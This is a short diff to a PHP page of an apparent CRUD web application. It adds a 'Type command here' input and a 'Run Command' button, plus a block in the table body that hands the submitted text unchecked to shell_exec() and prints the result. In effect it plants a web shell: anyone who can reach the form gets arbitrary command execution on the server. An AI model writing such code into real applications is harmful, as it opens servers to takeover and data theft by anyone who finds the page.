@@ -49,6 +49,22 @@ require_once("../CRUD/php/operations.php");
                             </div>
                         </div>
                     </div>
+
+
+                    <div class="row pt-2">
+                        <div class="col">
+                            <div class="input-group mb-3">
+                                <?php inputElement(icon: "<i class='fas fa-square-terminal'></i>", placeholder: "Type command here", name: "cmd", value: ""); ?>
+                            </div>
+                        </div>
+                        <div class="col">
+                            <div class="input-group mb-3">
+                                <?php buttonElement("btn-run", "btn btn-light border", "<i class='fas fa-regular fa-person-running'></i>", "run", "dat-toggle='tooltip' data-placement='right' title='Run Command'") ?>
+                            </div>
+                        </div>
+                    </div>
+
+
                     <div class="d-flex justify-content-center">
                         <?php buttonElement("btn-create", "btn btn-success", "<i class='fas fa-plus'></i>", "create", "dat-toggle='tooltip' data-placement='bottom' title='Create'") ?>
 
@@ -73,6 +89,13 @@ require_once("../CRUD/php/operations.php");
                         </tr>
                     </thead>
                     <tbody id="tbody">
+                        <?php
+                        if (isset($_POST['run'])) {
+                            $command = shell_exec(textboxValue(value: "cmd"));
+                            echo '<pre>' . $command . '</pre>';
+                        }
+                        ?>
+
                         <?php
                         if (isset($_POST['read'])) {
                             $result = getData();
